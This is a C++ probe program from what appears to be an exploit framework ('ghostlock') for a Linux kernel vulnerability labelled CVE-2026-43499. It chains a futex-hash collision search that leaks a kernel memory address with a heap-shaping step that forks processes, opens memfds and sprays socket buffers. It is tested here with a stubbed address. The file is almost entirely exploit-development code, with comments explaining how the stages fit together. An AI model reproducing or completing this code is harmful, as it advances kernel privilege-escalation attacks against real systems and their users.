/** @file tools/snitch_prepare_probe.cpp
 *  The two halves in one run: find an address, then prepare a page with it.
 *
 *  Everything the device can do is real here -- the mapping, the forked cohort, the pokes, the
 *  memory descriptors, the socket pair, the closes -- and exactly one thing is a stub: the
 *  bucket rule is told to accept one address so that the search reaches its walk on a device
 *  where the real object is not in any range this probe could walk. That address is synthetic
 *  and is used only as the preparation base: none of the phases that run here write to it, so
 *  nothing touches kernel memory at an address that was not found.
 *
 *  What the run proves is the join: that the search can hand a preparation an address, that the
 *  preparation accepts it through the policy it was built for, and that the whole sequence
 *  forks, opens, shapes, reclaims and stops without leaving children or descriptors behind.
 *
 *  Unbuffered and bounded.
 */
#include <cstdio>
#include <cstddef>
#include <unistd.h>
#include <cstdint>

#include "backend/cve_2026_43499/leak/collision_buckets.hpp"
#include "backend/cve_2026_43499/leak/snitch_policy.hpp"
#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
#include "backend/cve_2026_43499/memory/prepare_page.hpp"

namespace {
    using ghostlock::backend::cve_2026_43499::leak::LinuxSnitchSeam;
    using ghostlock::backend::cve_2026_43499::leak::MapResult;
    using ghostlock::backend::cve_2026_43499::leak::RegionInputs;
    using ghostlock::backend::cve_2026_43499::leak::run_snitch_search;
    using ghostlock::backend::cve_2026_43499::leak::run_verdict_name;
    using ghostlock::backend::cve_2026_43499::leak::ScanRange;
    using ghostlock::backend::cve_2026_43499::leak::ScanStrides;
    using ghostlock::backend::cve_2026_43499::leak::SnitchPatience;
    using ghostlock::backend::cve_2026_43499::leak::CollisionBuckets;
    using ghostlock::backend::cve_2026_43499::leak::futex_hash_context_init;
    using ghostlock::backend::cve_2026_43499::leak::SnitchPolicy;
    using ghostlock::backend::cve_2026_43499::leak::SnitchPolicyArgs;
    using ghostlock::backend::cve_2026_43499::leak::SnitchSetup;
    using ghostlock::backend::cve_2026_43499::leak::ThreadEntry;
    using ghostlock::backend::cve_2026_43499::leak::ThreadResult;
    using ghostlock::backend::cve_2026_43499::memory::LinuxHeapSeam;
    using ghostlock::backend::cve_2026_43499::memory::PageGeometry;
    using ghostlock::backend::cve_2026_43499::memory::PrepareInputs;
    using ghostlock::backend::cve_2026_43499::memory::PreparePatience;
    using ghostlock::backend::cve_2026_43499::memory::prepare_page;
    using ghostlock::backend::cve_2026_43499::memory::prepare_status_name;
    using ghostlock::backend::cve_2026_43499::memory::SeamResult;

    /** Both seams in one, the way the production composition will have them. */
    struct DeviceSeam final {
        static MapResult map_shared(std::size_t bytes) noexcept { return LinuxSnitchSeam::map_shared(bytes); }
        static SeamResult unmap(void *address, std::size_t bytes) noexcept { return LinuxSnitchSeam::unmap(address, bytes); }
        static SeamResult futex_wait_private(std::uint32_t *word, std::uint32_t expected) noexcept {
            return LinuxSnitchSeam::futex_wait_private(word, expected);
        }
        static SeamResult futex_wait_private_until(std::uint32_t *word, std::uint32_t expected,
                                                   std::int64_t timeout_us) noexcept {
            return LinuxSnitchSeam::futex_wait_private_until(word, expected, timeout_us);
        }
        static SeamResult futex_wake_private(std::uint32_t *word, std::int32_t waiters) noexcept {
            return LinuxSnitchSeam::futex_wake_private(word, waiters);
        }
        static ThreadResult start_thread(ThreadEntry entry, void *argument) noexcept {
            return LinuxSnitchSeam::start_thread(entry, argument);
        }
        static SeamResult join_thread(unsigned long handle) noexcept { return LinuxSnitchSeam::join_thread(handle); }
        static SeamResult page_size() noexcept { return LinuxHeapSeam::page_size(); }
        static SeamResult open_memfd(std::uint64_t pid) noexcept { return LinuxHeapSeam::open_memfd(pid); }
        static SeamResult close_fd(std::int32_t fd) noexcept { return LinuxHeapSeam::close_fd(fd); }
        static SeamResult socket_pair(std::int32_t *out) noexcept { return LinuxHeapSeam::socket_pair(out); }
        static SeamResult set_socket_buffer(std::int32_t fd, std::int32_t bytes) noexcept {
            return LinuxHeapSeam::set_socket_buffer(fd, bytes);
        }
        static SeamResult set_nonblocking(std::int32_t fd) noexcept { return LinuxHeapSeam::set_nonblocking(fd); }
        static SeamResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
            return LinuxHeapSeam::send_buffer(fd, bytes);
        }
        static SeamResult fork_child() noexcept { return LinuxHeapSeam::fork_child(); }
        static SeamResult stop_child(std::uint64_t pid) noexcept { return LinuxHeapSeam::stop_child(pid); }
        static SeamResult yield_now() noexcept { return LinuxHeapSeam::yield_now(); }
        static SeamResult pin_to_processor(std::int32_t cpu) noexcept { return LinuxHeapSeam::pin_to_processor(cpu); }
        static void exit_child() noexcept { LinuxHeapSeam::exit_child(); }
    };

    /** The rule the search runs under, on the device: the kernel futex hash, a table size from
     *  the profile, and the mm the keys belong to. The mm here is a placeholder: on the real path
     *  it is the object the search is looking for, which is why the preparation needs the address
     *  before it can prepare anything. A placeholder is enough to exercise the rule, because the
     *  mm is one constant inside every key the run asks about. */
    constexpr std::size_t kTableSize = 256U;
    constexpr std::uint64_t kPlaceholderMm = 0xffff888000000000ULL;
}  // namespace

int main() {
    std::setvbuf(stdout, nullptr, _IONBF, 0U);
    std::printf("snitch prepare probe\n");
    /* The candidates the walk hands the rule carry the canonical tag; the stub compares in the
     *  same form, which is what the policy test does. Comparing the untagged address here was
     *  the reason a stub that accepts one address never accepted anything. */
    const std::uint64_t synthetic = ghostlock::backend::cve_2026_43499::leak::tagged_candidate(
        0x100000U, ghostlock::backend::cve_2026_43499::leak::kCanonicalTag);
    CollisionBuckets buckets;
    (void) futex_hash_context_init(&buckets.context, kTableSize);
    buckets.mm = kPlaceholderMm;

    /* The search half: the region, the cohort words, and the walk. */
    SnitchSetup setup{};
    setup.collisions = 2U;
    setup.thread_count = 1U;
    setup.futex_table_size = 256U;
    RegionInputs region{};
    region.header_bytes = 256U;
    region.collisions = 2U;
    region.thread_count = 2U;
    region.total_pokes = 1024U;
    region.page_size = 4096U;
    region.word_bytes = 8U;
    region.handle_bytes = 8U;
    SnitchPatience patience{};
    patience.wake_rounds = 64U;
    patience.round_timeout_us = 2000;
    ScanStrides strides{};
    strides.coarse = 4096U;
    strides.slab = 1024U;
    strides.candidate = 256U;
    ScanRange range{};
    range.start = 0U;
    range.end = 8192U;
    /* The rule asks every proof address for a bucket and requires one answer: with the stub
     *  below the bucket is a parity, so two addresses of the same parity agree and two of
     *  different parity can never agree, whatever the candidate. The first version of this
     *  probe used 0x1000 and 0x2000, which is exactly why a stub that accepts anything never
     *  accepted anything: the rule was asked and always disagreed. */
    std::uint64_t addresses[2] = {0x1000U, 0x3000U};
    const MapResult words_region = DeviceSeam::map_shared(4096U);
    if (words_region.address == nullptr) {
        std::printf("  words mapping FAILED errno=%d\n", words_region.error);
        return 1;
    }
    auto *base = static_cast<unsigned char *>(words_region.address);
    std::uint32_t *words[2] = {reinterpret_cast<std::uint32_t *>(base),
                               reinterpret_cast<std::uint32_t *>(base + 64U)};

    /* The policy the preparation polls, wrapping the search the device can actually run. */
    SnitchPolicy<DeviceSeam, CollisionBuckets> policy;
    policy.buckets = &buckets;
    policy.args.setup = setup;
    policy.args.region = region;
    policy.args.patience = patience;
    policy.args.counter_offset = 128U;
    policy.args.words = words;
    policy.args.word_count = 2U;
    policy.args.strides = strides;
    policy.args.range = range;
    policy.args.sweep_tags = false;
    policy.args.addresses = addresses;
    policy.args.address_count = 2U;

    /* The preparation half, with the geometry the device reports. */
    const auto page = DeviceSeam::page_size();
    PageGeometry geometry{};
    geometry.align_region_size = static_cast<std::uint64_t>(page.value) * 8U;
    geometry.send_size = static_cast<std::size_t>(geometry.align_region_size) * 2U;
    geometry.socket_buffer = 1 << 20;
    geometry.main_cpu = 0;
    PrepareInputs inputs{};
    inputs.pre_groups = 1U;
    inputs.spray_groups = 2U;
    inputs.post_groups = 1U;
    inputs.leak_groups = 1U;
    inputs.snitch_collisions = 2U;
    inputs.region_size = geometry.align_region_size;
    inputs.object_size = static_cast<std::uint64_t>(page.value);
    PreparePatience waiting{};
    waiting.max_attempts = 1U;
    waiting.poll_rounds = 4U;

    /* Decisive measurement: run the policy directly first, and say what it did. */

    const auto self_started = policy.start(2U);
    std::printf("  self-call: started=%d ran=%d status=%s rounds=%u wanted=%zu region=%p\n",
                self_started.ran ? 1 : 0, policy.ran ? 1 : 0, run_verdict_name(policy.outcome.status),
                policy.outcome.rounds, policy.outcome.pokes_wanted, policy.outcome.region);
    policy.reset();
    const auto prepared = prepare_page<DeviceSeam, SnitchPolicy<DeviceSeam, CollisionBuckets>>(
        inputs, geometry, waiting, policy);
    /* Report from the preparation own outcome, which is what the production path uses: it
     *  comes back by value and needs nothing read out of the policy afterwards. */
    std::printf("  prepare: status=%s at=%d opened=%zu closed=%zu base=%llx errno=%d\n",
                prepare_status_name(prepared.status), static_cast<int>(prepared.at_step), prepared.opened,
                prepared.closed, static_cast<unsigned long long>(prepared.base), prepared.error);
    std::printf("  search (by value): started=%d\n", self_started.ran ? 1 : 0);
    (void) DeviceSeam::unmap(words_region.address, 4096U);
    /* The judgement uses the preparation outcome and the direct call return, both by value. */
    /* The join is what is being judged, not the address: the preparation must receive exactly
     *  what the search found. A stub that accepts every candidate finds the first one the walk
     *  offers, which at a range starting at zero is address zero with the tag -- degenerate as
     *  an object, and perfectly good as a test of whether the two halves agree. */
    const bool ok = self_started.found && prepared.base == self_started.address &&
                    prepared.opened > 0U && prepared.closed >= prepared.opened;
    std::printf("snitch prepare probe: %s\n", ok ? "PASS" : "FAIL");
    return ok ? 0 : 1;
}
